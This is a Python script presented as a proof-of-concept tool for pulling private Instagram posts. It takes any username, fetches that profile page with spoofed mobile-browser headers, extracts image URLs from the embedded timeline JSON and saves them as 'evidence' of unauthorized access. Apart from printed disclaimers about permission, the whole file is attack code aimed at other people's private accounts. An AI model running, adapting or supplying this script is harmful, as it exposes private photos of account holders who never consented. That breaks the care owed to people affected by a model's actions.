import os
import requests
import json
from bs4 import BeautifulSoup
from urllib.parse import unquote
import time

def banner():
    os.system('clear')
    # Green color code for a professional look
    print("\033[1;32m")
    print(r"""
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    [+-] Created By : X SPYDOX
    [+-] Tool Name  : INSTAGRAM PRIVATE POST MONITOR
    [+-] Version    : INSTAGRAM POC 2026
    """)
    print("\033[0m") # Color reset

def fetch_instagram_profile(username):
    """
    Fetches Instagram profile page for the given username.
    """
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en;q=0.9',
        'dpr': '1',
        'priority': 'u=0, i',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-full-version-list': '"Google Chrome";v="141.0.7390.56", "Not?A_Brand";v="8.0.0.0", "Chromium";v="141.0.7390.56"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"Nexus 5"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"6.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'viewport-width': '1000',
    }

    url = f'https://www.instagram.com/{username}/'

    print(f"[*] Fetching profile: {username}")
    response = requests.get(url, headers=headers)

    if response.status_code != 200:
        print(f"[-] Error: Received status code {response.status_code}")
        return None

    print("[+] Successfully fetched profile page")
    return response


def extract_timeline_data(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    script_tags = soup.find_all('script', {'type': 'application/json'})

    print(f"[*] Found {len(script_tags)} JSON script tags")

    for script in script_tags:
        script_content = script.string

        if not script_content:
            continue

        if 'polaris_timeline_connection' in script_content and 'image_versions2' in script_content:
            print("[+] Found script with timeline data")

            try:
                data = json.loads(script_content)
                return data
            except json.JSONDecodeError as e:
                print(f"[-] JSON parsing error: {e}")
                continue

    print("[-] Timeline data not found in any script tag")
    return None


def decode_url(escaped_url):
    try:
        decoded = escaped_url.encode('utf-8').decode('unicode_escape')
    except:
        decoded = escaped_url

    decoded = unquote(decoded)
    return decoded


def extract_all_image_urls_recursive(obj, urls=None, post_id=None):
    if urls is None:
        urls = set()

    if isinstance(obj, dict):
        if 'pk' in obj and isinstance(obj.get('pk'), str):
            post_id = obj['pk']

        if 'image_versions2' in obj:
            candidates = obj['image_versions2'].get('candidates', [])
            for candidate in candidates:
                url = candidate.get('url', '')
                height = candidate.get('height', 0)
                width = candidate.get('width', 0)
                resolution = f"{width}x{height}"

                if url:
                    decoded_url = decode_url(url)
                    urls.add((post_id or 'unknown', resolution, decoded_url))

        for value in obj.values():
            extract_all_image_urls_recursive(value, urls, post_id)

    elif isinstance(obj, list):
        for item in obj:
            extract_all_image_urls_recursive(item, urls, post_id)

    return urls


def save_urls_to_file(image_urls, filename='extracted_urls.txt'):
    urls_by_post = {}
    for post_id, resolution, url in image_urls:
        if post_id not in urls_by_post:
            urls_by_post[post_id] = []
        urls_by_post[post_id].append((resolution, url))

    with open(filename, 'w', encoding='utf-8') as f:
        f.write("Instagram Private Post URLs - POC Evidence\n")
        f.write("=" * 80 + "\n\n")
        f.write(f"Total Posts: {len(urls_by_post)}\n")
        f.write(f"Total Image URLs: {len(image_urls)}\n\n")
        f.write("=" * 80 + "\n\n")

        for post_id, resolutions in urls_by_post.items():
            f.write(f"POST ID: {post_id}\n")
            f.write(f"Number of images: {len(resolutions)}\n")
            f.write("-" * 80 + "\n")

            for i, (resolution, url) in enumerate(resolutions, 1):
                f.write(f"\n  Image {i}:\n")
                f.write(f"  Resolution: {resolution}\n")
                f.write(f"  URL: {url}\n")

            f.write("\n" + "=" * 80 + "\n\n")

    print(f"[+] Saved {len(image_urls)} URLs from {len(urls_by_post)} posts to {filename}")


def main():
    # Calling the banner at the start
    banner()

    print("=" * 80)
    print("Instagram Private Account Access - All Post")
    print("Authorized & Ethical Use Only - Meta Insta Poc")
    print("=" * 80)
    print()

    username = input("Enter Instagram username to Start Poc: ").strip()

    if not username:
        print("[-] Error: Username cannot be empty")
        return

    print()
    print("[!] WARNING: Only test on accounts you own or have permission to test")
    print("[!] This demonstrates unauthorized access to private content")
    print()

    time.sleep(1)

    response = fetch_instagram_profile(username)

    if not response:
        print("[-] Failed to fetch profile page")
        return

    timeline_data = extract_timeline_data(response.text)

    if not timeline_data:
        print("[-] Failed to extract timeline data")
        return

    print()
    print("[*] Extracting all image URLs recursively...")
    image_urls = extract_all_image_urls_recursive(timeline_data)

    if not image_urls:
        print("[-] No image URLs found")
        return

    urls_list = sorted(list(image_urls), key=lambda x: (x[0], x[1]))
    posts_count = len(set(url[0] for url in urls_list))

    print()
    print("=" * 80)
    print(f"VULNERABILITY CONFIRMED")
    print(f"Extracted {len(urls_list)} private image URLs from {posts_count} posts")
    print("=" * 80)
    print()

    save_urls_to_file(image_urls)

    print()
    print("[+] POC Complete")
    print("[*] Evidence saved to: extracted_urls.txt")
    print()


if __name__ == "__main__":
    main()
